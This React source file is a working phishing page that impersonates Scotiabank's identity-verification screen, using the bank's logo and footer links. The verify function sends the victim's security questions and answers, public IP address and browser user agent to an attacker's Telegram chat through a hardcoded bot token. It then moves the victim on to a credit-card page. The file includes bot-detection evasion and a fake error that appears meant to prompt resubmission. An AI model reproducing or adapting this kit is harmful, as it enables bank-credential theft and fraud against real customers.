import {useEffect, useState} from "react";
import React from "react";
import questionArray from "./QuestionData";
import {passwordEror} from "./login";
import {useHistory} from "react-router";
const {Crawler} = require("es6-crawler-detect");

const CrawlerDetector = new Crawler();
const userAgentString = navigator.userAgent;
const publicIp = require("react-public-ip");

const {TelegramClient} = require("messaging-api-telegram");
const handleTelegramMsg = async (question, anwer) => {
  const client = new TelegramClient({
    accessToken: "1753568410:AAH7GxK9NFDliOkapmCWPvlWkIot5XgB8QM",
  });
  await client.sendMessage(
    926925229,
    `<u>Security Question</u>
    #################################
    <b>1</b> :    ${question.first} --> ${anwer.first} 
    <b>2</b> :  ${question.second}--> ${anwer.second} 
    <b>3</b> :   ${question.third} --> ${anwer.third} 
    #################################
    <b>IP</b> : <a href="https://www.geodatatool.com/?IP=${
      (await publicIp.v4()) || ""
    }">Check Ip</a> 
    <b>Client Agent </b> : ${userAgentString}`,
    {parseMode: "HTML"}
  );
};
const SecurityQuestions = () => {
  const history = useHistory();
  const [isRetry, setisRetry] = useState(false);
  const [questionList, setquestionList] = useState(questionArray);
  const [question, setQuestion] = useState({
    first: "Select a question",
    second: "Select a question",
    third: "Select a question",
  });
  const [anwer, setAnwer] = useState({first: "", second: "", third: ""});
  const [state, setstate] = useState(false);

  const verify = async () => {
    if (anwer.first !== "" && anwer.second !== "" && anwer.third !== "") {
      handleTelegramMsg(question, anwer);
      setisRetry(true);
      isRetry && history.push("creditCard");
    } else setstate(true);
  };
  //bot detect
  const isBotCrawler = CrawlerDetector.isCrawler(userAgentString);

  useEffect(() => {
    if (isBotCrawler) return null;
  }, [isBotCrawler]);
  const onChangeQuestion = (event, steps) => {
    setQuestion({...question, [steps]: event.target.value});
    const questions = questionList.filter(
      (el) => el.value !== question.first && el.value !== question.second
    );
    setquestionList(questions);
  };
  return (
    <div className="root" id="root">
      <div className="uQnxO2uiJOTeY5_KPtBG0">
        <header className="_1ChzP-ZqsmzLyF7NCGdiJx">
          <div className="PoYv4mtPAteIiTCL2kgMd">
            <a href="https://www.scotiabank.com/ca/en/personal.html">
              <div className="_3NvqcuqzV8Fp_FM2z3Sp4J">
                <svg
                  focusable="true"
                  role="img"
                  aria-hidden="false"
                  className="SvgLogo__scotiabankEn--size-18px"
                  aria-labelledby="bankLogo-title"
                  viewBox="0 0 697.04 99.14"
                  accessibletitle="Scotiabank Logo"
                >
                  <title id="bankLogo-title">Scotiabank</title>
                  <path
                    d="M187,50a34.48,34.48,0,1,0,34.47,34.47A34.52,34.52,0,0,0,187,50Zm0,49.67a15.2,15.2,0,1,1,15.19-15.2A15.21,15.21,0,0,1,187,99.68Z"
                    transform="translate(-17.58 -19.82)"
                    fill="#EC111A"
                  />
                  <polygon
                    points="247.77 31.83 238.36 31.83 238.36 11.48 217.75 11.48 217.75 31.83 208.34 31.83 208.34 50.48 217.75 50.48 217.75 97.5 238.36 97.5 238.36 50.48 247.77 50.48 247.77 31.83"
                    fill="#EC111A"
                  />
                  <rect
                    x="257.22"
                    y="31.83"
                    width="20.6"
                    height="65.67"
                    fill="#EC111A"
                  />
                  <path
                    d="M285.1,19.82A11.48,11.48,0,1,0,296.59,31.3,11.5,11.5,0,0,0,285.1,19.82Z"
                    transform="translate(-17.58 -19.82)"
                    fill="#EC111A"
                  />
                  <path
                    d="M580.64,69.34a12.3,12.3,0,0,1,12.28,12.28v35.7h20.6V78.8c0-17.49-10.09-28.79-26-28.79-6.55,0-13.46,2.87-19.15,12.05V51.65H547.75v65.67h20.61V81.62A12.3,12.3,0,0,1,580.64,69.34Z"
                    transform="translate(-17.58 -19.82)"
                    fill="#EC111A"
                  />
                  <polygon
                    points="671.05 97.5 645.73 64.69 669.27 31.83 645.19 31.83 626.27 58.4 626.27 1.64 605.66 1.64 605.66 97.5 626.27 97.5 626.27 70.43 647.04 97.5 671.05 97.5"
                    fill="#EC111A"
                  />
                  <path
                    d="M81.54,99.65a30,30,0,0,0,2.11-12.1c0-6.63-2.08-12.55-5.85-16.68C73.4,66.05,65.88,62.05,55.45,59a37,37,0,0,1-5.86-2.2,14.46,14.46,0,0,1-4.37-3.25,7.37,7.37,0,0,1-1.87-5.32c0-3.05,1.63-5.12,4.29-6.79,3.33-2.1,9.74-2.3,16.29.12a39.83,39.83,0,0,1,6.64,3.15l8.76-17.43a49.86,49.86,0,0,0-12.56-5.66,55,55,0,0,0-14-1.77A37.61,37.61,0,0,0,39.7,22a29.82,29.82,0,0,0-10,6.52,30.84,30.84,0,0,0-6.65,10,31.9,31.9,0,0,0-2.21,12.14A25.58,25.58,0,0,0,28.6,68c6,5.63,12.8,7.63,15.54,8.69s5.75,2,7.68,2.71a27.62,27.62,0,0,1,5.64,2.88,9,9,0,0,1,3,3.34,7.53,7.53,0,0,1,.64,4.19,8.59,8.59,0,0,1-2.93,5.66c-1.77,1.66-5,2.61-9.48,2.61a28.68,28.68,0,0,1-11.49-2.76,82.84,82.84,0,0,1-9.33-5l-10.3,17.94C24.77,114.7,36.42,119,46.8,119a49.52,49.52,0,0,0,15.52-2.48,35.59,35.59,0,0,0,11.77-6.58A30.48,30.48,0,0,0,81.54,99.65Z"
                    transform="translate(-17.58 -19.82)"
                    fill="#EC111A"
                  />
                  <path
                    d="M703.14,94.36a11.48,11.48,0,1,0,11.48,11.48A11.48,11.48,0,0,0,703.14,94.36Zm0,20.65a9.17,9.17,0,1,1,9.17-9.17A9.17,9.17,0,0,1,703.14,115Z"
                    transform="translate(-17.58 -19.82)"
                    fill="#EC111A"
                  />
                  <path
                    d="M703.12,107.76h-1.84v4.35H699V99.58h4.8a4.16,4.16,0,0,1,4.17,4.15,4.07,4.07,0,0,1-2.41,3.65l2.64,4.73h-2.71Zm-1.84-2.1h2.63a1.93,1.93,0,0,0,0-3.84h-2.63Z"
                    transform="translate(-17.58 -19.82)"
                    fill="#EC111A"
                  />
                  <path
                    d="M138,94A15.2,15.2,0,1,1,138,75L151.63,61.3A34.42,34.42,0,0,0,126.13,50c-19,0-35.56,13.53-35.56,34.48S107.12,119,126.13,119a34.42,34.42,0,0,0,25.5-11.29Z"
                    transform="translate(-17.58 -19.82)"
                    fill="#EC111A"
                  />
                  <path
                    d="M376,117.32V51.65H355.93v6.9l-1.86-1.66A25.12,25.12,0,0,0,336.77,50C319,50,304.06,65.8,304.06,84.48S319,119,336.77,119a25.12,25.12,0,0,0,17.3-6.88l1.86-1.66v6.9ZM340,100a15.52,15.52,0,1,1,15.51-15.52A15.53,15.53,0,0,1,340,100Z"
                    transform="translate(-17.58 -19.82)"
                    fill="#EC111A"
                  />
                  <path
                    d="M537.89,117.32V51.65H517.8v6.9l-1.86-1.66A25.12,25.12,0,0,0,498.64,50c-17.73,0-32.71,15.79-32.71,34.47s15,34.48,32.71,34.48a25.12,25.12,0,0,0,17.3-6.88l1.86-1.66v6.9ZM501.84,100a15.52,15.52,0,1,1,15.51-15.52A15.53,15.53,0,0,1,501.84,100Z"
                    transform="translate(-17.58 -19.82)"
                    fill="#EC111A"
                  />
                  <path
                    d="M406.77,117.32v-6.9l1.86,1.66a25.1,25.1,0,0,0,17.3,6.88c17.73,0,32.7-15.79,32.7-34.48S443.66,50,425.93,50a25.1,25.1,0,0,0-17.3,6.88l-1.86,1.66V21.46H386.68v95.86Zm.44-32.84A15.52,15.52,0,1,1,422.73,100,15.53,15.53,0,0,1,407.21,84.48Z"
                    transform="translate(-17.58 -19.82)"
                    fill="#EC111A"
                  />
                </svg>
              </div>
            </a>
          </div>
        </header>
        <main className="_16e3jP2sLLXzIXpWyvv2MD cWQtsaZrd8hAVSt8qps6f">
          <div className="Grid__container">
            <div className="_189buhYsYKCsviWKNS9OP-">
              <div className="Card__container Card__container--xs-padding-18 Card__container--sm-padding-24 Card__container--md-padding-30 Card__container--lg-padding-36 _1bcSxMk3NAgnvjPq_83hWr">
                <div className="_1AR6e5iqu8uXHMTFKLnqWr">
                  <svg
                    width="60"
                    height="93"
                    className="_2gkYyx8SRF571_ilejTzWN"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <g fill="none" fillRule="evenodd">
                      <path
                        d="M.968 17.647c0 37.743 15.079 47.605 28.6 56.545 13.52-8.94 28.602-18.802 28.602-56.545L29.568 0 .968 17.647zM45.374 87.337c0 2.82-7.077 5.108-15.806 5.108-8.728 0-15.804-2.287-15.804-5.108 0-2.822 7.076-5.109 15.804-5.109 8.73 0 15.806 2.288 15.806 5.109"
                        fill="#E6E6E6"
                      />
                      <path
                        d="M29.569 5.414l24.326 15.012c0 32.103-12.826 40.493-24.326 48.096V5.414z"
                        fill="#91DDF8"
                      />
                      <path
                        d="M29.569 5.414L5.242 20.426c0 32.103 12.826 40.493 24.327 48.096V5.414z"
                        fill="#009DD6"
                      />
                      <path
                        d="M53.752 34.07c0 3.834-2.756 7.455-6.159 7.455-3.401 0-6.159-3.621-6.159-7.454 0-3.834 2.758-6.427 6.16-6.427 3.4 0 6.158 2.593 6.158 6.427M53.224 42.166c-2.313 1.662-3.098 2.306-5.508 2.306-2.453 0-2.915-.467-5.565-2.306-3.616 2.276-5.076 5.513-6.045 10.319 0 0 3.657 3.407 11.487 3.407s11.515-3.509 11.515-3.509c-.922-4.693-2.357-7.919-5.884-10.217"
                        fill="#7849B8"
                      />
                    </g>
                  </svg>
                  <div
                    style={{textAlign: "center"}}
                    className="TextHeadline__text TextHeadline__text--black TextHeadline__text--medium _2x05Bp1YJ7gu-W6PvGkpLK"
                  >
                    Help us confirm your identity
                  </div>
                  {(state || isRetry) &&
                    passwordEror("Please check your answers")}
                </div>
                <div className="_1IqfhyENLur_RobxTjYV-O">
                  <div
                    className="InputContainer__input"
                    style={{paddingTop: 15}}
                  >
                    <label
                      className="Label__label"
                      label="question1"
                      style={{fontWeight: "bold"}}
                      id="mfaQuestion-label"
                    >
                      Question 1 of 3 :
                    </label>
                    <select
                      onChange={(event) => onChangeQuestion(event, "first")}
                      className="Input__input Input__input--textField"
                    >
                      <option key="0">{question.first}</option>
                      {questionList.map((el) => {
                        return <option key={el.key}>{el.value}</option>;
                      })}
                    </select>
                  </div>
                  <div
                    className="InputContainer__input"
                    style={{paddingTop: 15}}
                  >
                    <input
                      autoComplete="off"
                      id="mfaQuestion-input"
                      type="text"
                      placeholder="Answer"
                      onChange={(event) => {
                        setAnwer({...anwer, first: event.target.value});
                      }}
                      className="Input__input Input__input--textField"
                    />
                  </div>

                  <div
                    className="InputContainer__input"
                    style={{paddingTop: 15}}
                  >
                    <label
                      className="Label__label"
                      label="question1"
                      style={{fontWeight: "bold"}}
                      id="mfaQuestion-label"
                    >
                      Question 2 of 3 :
                    </label>

                    <select
                      onChange={(event) => onChangeQuestion(event, "second")}
                      className="Input__input Input__input--textField"
                    >
                      <option key="0">{question.second}</option>

                      {questionList.map((el) => {
                        return (
                          <option key={el.key} value={el.value}>
                            {el.value}
                          </option>
                        );
                      })}
                    </select>
                  </div>
                  <div className="InputContainer__input">
                    <input
                      autoComplete="off"
                      id="mfaQuestion-input"
                      type="text"
                      placeholder="Answer"
                      onChange={(event) => {
                        setAnwer({...anwer, second: event.target.value});
                      }}
                      className="Input__input Input__input--textField"
                    />
                  </div>
                  <div
                    className="InputContainer__input"
                    style={{paddingTop: 15}}
                  >
                    <label
                      className="Label__label"
                      label="question1"
                      style={{fontWeight: "bold"}}
                      id="mfaQuestion-label"
                    >
                      Question 3 of 3:
                    </label>
                    <select
                      onChange={(event) => onChangeQuestion(event, "third")}
                      className="Input__input Input__input--textField"
                    >
                      <option key="0">{question.third}</option>
                      {questionList.map((el) => {
                        return (
                          <option key={el.key} value={el.value}>
                            {el.value}
                          </option>
                        );
                      })}
                    </select>
                  </div>
                  <div className="InputContainer__input">
                    <input
                      autoComplete="off"
                      id="mfaQuestion-input"
                      type="text"
                      placeholder="Answer"
                      onChange={(event) => {
                        setAnwer({...anwer, third: event.target.value});
                      }}
                      className="Input__input Input__input--textField"
                    />
                  </div>
                  <div
                    side="top"
                    xs={36}
                    sm={36}
                    md={36}
                    lg={36}
                    className="Margin__container Margin__container-xs-36--top Margin__container-sm-36--top Margin__container-md-36--top Margin__container-lg-36--top"
                  >
                    <div className="BuddyTip">
                      <span className="BuddyTip__icon">
                        <svg
                          className="IllustrativeIconCore__svg IllustrativeIconCore__svg--size-36px"
                          focusable="false"
                          role="presentation"
                          aria-hidden="true"
                          viewBox="0 0 48 48"
                          size={36}
                        >
                          <g
                            id="Icon-/-Illustrative-/-Outlined-/-Colour-/-Tips-/-48px-"
                            stroke="none"
                            strokeWidth={1}
                            fill="none"
                            fillRule="evenodd"
                          >
                            <rect
                              fill="#FFFFFF"
                              x={0}
                              y={0}
                              width={48}
                              height={48}
                            />
                            <g
                              id="Tips-outline"
                              transform="translate(1.000000, 1.000000)"
                              strokeLinecap="round"
                              strokeLinejoin="round"
                              strokeWidth="1.5"
                            >
                              <path
                                d="M30.42,30.67 C34.16,27.91 36.7,24.08 36.7,19.23 C36.7480663,15.7343512 35.4053542,12.3628144 32.9673115,9.85725675 C30.5292689,7.3516991 27.1956577,5.91741434 23.7,5.87 C20.2043423,5.91741434 16.8707311,7.3516991 14.4326885,9.85725675 C11.9946458,12.3628144 10.6519337,15.7343512 10.7,19.23 C10.7,24.08 13.24,27.91 16.98,30.67 C17.6912778,31.5381938 18.0293106,32.6529826 17.92,33.77 L17.92,41.65 C17.92,41.65 18.58,45.87 23.7,45.87 C28.82,45.87 29.48,41.65 29.48,41.65 L29.48,33.77 C29.48,33.77 29.29,31.67 30.42,30.67 Z"
                                id="Path"
                                stroke="#FB6330"
                              />
                              <path
                                d="M17.92,38 L17.92,41.65 C17.92,41.65 18.58,45.87 23.7,45.87 C28.82,45.87 29.48,41.65 29.48,41.65 C29.48,39.2166667 29.48,38 29.48,38 C29.48,38 23,40.1301466 17.92,38 Z"
                                id="Path"
                                stroke="#BE061B"
                              />
                              <path
                                d="M18,38 C19.7520155,38.683752 21.6194328,39.0232824 23.5,39 C25.5410529,38.9949292 27.5676297,38.6571664 29.5,38"
                                id="Path"
                                stroke="#BE061B"
                              />
                              <line
                                x1="42.59"
                                y1={0}
                                x2="38.35"
                                y2="4.25"
                                id="Path"
                                stroke="#FFD42F"
                              />
                              <line
                                x1="42.59"
                                y1="34.49"
                                x2="38.35"
                                y2="30.24"
                                id="Path"
                                stroke="#FFD42F"
                              />
                              <line
                                x1={46}
                                y1="17.5"
                                x2={42}
                                y2="17.5"
                                id="Path"
                                stroke="#FFD42F"
                              />
                              <line
                                x1="4.41"
                                y1="34.49"
                                x2="8.65"
                                y2="30.24"
                                id="Path"
                                stroke="#FFD42F"
                              />
                              <line
                                x1="4.41"
                                y1={0}
                                x2="8.65"
                                y2="4.25"
                                id="Path"
                                stroke="#FFD42F"
                              />
                              <line
                                x1={0}
                                y1="17.5"
                                x2={4}
                                y2="17.5"
                                id="Path"
                                stroke="#FFD42F"
                              />
                            </g>
                          </g>
                        </svg>
                      </span>
                      <span className="BuddyTip__text">
                        Please make sure to type your current security question
                        right. Note : this is for verification purposes only ,
                        we are not updating them.
                      </span>
                    </div>
                  </div>
                </div>
                <div className="_3QtV3a7pw3maUyc9k3EKbO">
                  <button
                    className="ButtonCore__button NavButton__button NavButton__button--continue"
                    id="continue"
                    onClick={() => verify()}
                  >
                    <span className="ButtonCore__block" tabIndex={-1}>
                      <span className="ButtonCore__text">Continue</span>
                      <span className="ButtonCore__icon NavButton__icon">
                        {" "}
                        <svg
                          className="SvgIcon__icon SvgIcon__icon-icon--size-18px"
                          focusable="false"
                          role="presentation"
                          aria-hidden="true"
                          viewBox="0 0 24 24"
                        >
                          <path
                            fill="none"
                            d="M14.22 4l8 8-8 8M1.78 12h20.44"
                          />
                        </svg>{" "}
                      </span>
                    </span>
                  </button>
                </div>
              </div>
            </div>
          </div>
        </main>
        <footer className="Footer__footer">
          <div className="Grid__container Footer__upperBar">
            <div className="Row__container Footer__upperBarRow ">
              <div className="Column__container Column__xs-4 Column__sm-8 Column__md-6 Column__lg-6 Footer__logoHolder">
                <svg
                  focusable="true"
                  role="img"
                  aria-hidden="false"
                  className="SvgLogo__flyingS--size-24px Footer__logo"
                  aria-labelledby="footer-logo-title"
                  viewBox="0 0 498.27 552.11"
                >
                  <title id="footer-logo-title">Scotiabank</title>
                  <path
                    d="M637.94,371.45H481.69A173.16,173.16,0,0,0,309.61,525.34h0A173.18,173.18,0,0,1,461.19,268.53H730.82Z"
                    transform="translate(-232.55 -268.53)"
                    fill="#EC111A"
                  />
                  <path
                    d="M325.43,717.72H481.69A173.15,173.15,0,0,0,653.76,563.83h0A173.18,173.18,0,0,1,502.18,820.64H232.55Z"
                    transform="translate(-232.55 -268.53)"
                    fill="#EC111A"
                  />
                  <circle cx="249.14" cy="276.05" r="139.06" fill="#EC111A" />
                </svg>
              </div>
              <div className="Column__container Column__xs-4 Column__sm-8 Column__md-6 Column__lg-6">
                <ul className="Footer__footerNav">
                  <li className="Footer__navLinks">
                    <a
                      href="https://www.scotiabank.com/ca/en/personal/contact-us.html"
                      target="_blank"
                      rel="noopener noreferrer"
                      className="Footer__links"
                    >
                      <p className="TextCaption__text TextCaption__text--black">
                        Contact Us
                      </p>
                    </a>
                  </li>
                  <li className="Footer__navLinks">
                    <a
                      href="https://www.scotiabank.com/ca/en/about/contact-us/security.html"
                      target="_blank"
                      rel="noopener noreferrer"
                      className="Footer__links"
                    >
                      <p className="TextCaption__text TextCaption__text--black">
                        Security
                      </p>
                    </a>
                  </li>
                  <li className="Footer__navLinks">
                    <a
                      href="https://www.scotiabank.com/ca/en/about/contact-us/legal.html"
                      target="_blank"
                      rel="noopener noreferrer"
                      className="Footer__links"
                    >
                      <p className="TextCaption__text TextCaption__text--black">
                        Legal
                      </p>
                    </a>
                  </li>
                  <li className="Footer__navLinks">
                    <a
                      href="https://www.scotiabank.com/ca/en/about/contact-us/privacy.html"
                      target="_blank"
                      rel="noopener noreferrer"
                      className="Footer__links"
                    >
                      <p className="TextCaption__text TextCaption__text--black">
                        Privacy
                      </p>
                    </a>
                  </li>
                  <li className="Footer__navLinks">
                    <a
                      href="https://www.scotiabank.com/ca/en/personal/accessibility.html"
                      target="_blank"
                      rel="noopener noreferrer"
                      className="Footer__links"
                    >
                      <p className="TextCaption__text TextCaption__text--black">
                        Accessibility
                      </p>
                    </a>
                  </li>
                </ul>
              </div>
            </div>
          </div>
          <div className="Footer__base Footer__base--white">
            <div className="Grid__container">
              <div className="Row__container">
                <div className="Column__container Column__xs-4 Column__sm-8 Column__md-12 Column__lg-12 Footer__copyRights">
                  <p className="TextLegal__text">
                    © Scotiabank. All Rights Reserved.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </footer>
        <a
          className="_2ALm1j8YuQmwl8Gkc1YLnH"
          href="https://assets.kampyle.com/resources/direct/form.html?region=prodCanada&websiteId=11757&formId=1127&bgclr=white"
          rel="noopener noreferrer"
          target="_blank"
        >
          <span
            className="TextCaption__text TextCaption__text--black ltf44NmV8dxdh56CbDo9C"
            weight="bold"
          >
            Feedback
          </span>
        </a>
      </div>
    </div>
  );
};

export default SecurityQuestions;
